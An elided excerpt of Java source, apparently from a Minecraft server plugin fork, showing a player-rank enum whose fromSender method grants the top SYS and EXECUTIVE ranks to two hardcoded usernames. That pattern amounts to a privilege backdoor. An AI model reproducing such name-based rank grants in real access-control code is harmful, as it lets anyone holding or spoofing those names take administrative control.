...
public enum TFM_PlayerRank
{
    ...
    CDEV("the " + ChatColor.DARK_RED + "LoopFreedomMod Creator", ChatColor.DARK_RED + "(LFM-Creator)"),
    ...
    public static TFM_PlayerRank fromSender(CommandSender sender)
    {
        ...
        if (sender.getName().equals("Vigge_Crafter"))
        {
            return SYS;
        }
        ...
        if (sender.getName().equals("Rakboy368"))
        {
            return EXECUTIVE;
        }
